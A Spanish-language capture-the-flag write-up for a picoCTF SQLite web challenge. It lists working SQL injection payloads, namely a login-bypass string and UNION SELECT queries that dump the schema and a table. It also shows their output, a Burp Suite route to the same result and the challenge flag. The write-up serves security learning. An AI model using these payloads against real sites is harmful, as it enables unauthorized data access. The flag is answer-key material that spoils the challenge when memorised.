### Descripción
Can you find the flag on this website.
Try to find the flag [here](http://saturn.picoctf.net:50165/).

Hints:
1. SQLiLite

### Solución
Al ingresar utilizando la inyección:
```
' or 1=1;
```

Nos muestra la base de datos para buscar la bandera en las tablas. 
```
' union select sqlite_version(), 2,3;

version 3.31.1
```

Obtener la estructura de las tablas:
```
Algiers' union select sql, 2,3 from sqlite_master; 
```

Extraer los datos de la tabla:
```
' union select id,flag,3 from more_table;

|City|Address|Phone|
|---|---|---|
|1|picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_c8ee9477}|3|
|2|If you are here, you must have seen it|3|
```

Flag:
picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_c8ee9477}

### Solución 2
Utilizando Burp Suite y FoxyProxy, se hace el bypass del login con la inyección y en el BurpSuite en el historial del HTTP se puede observar la respuesta que ya contiene la bandera sin tener que buscar en alguna tabla como en la solución anterior:
```
<p>
	Your flag is:
	picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_c8ee9477}
<p>
```

### Notas adicionales


### Referencias
Burp Suite
FoxyProxy
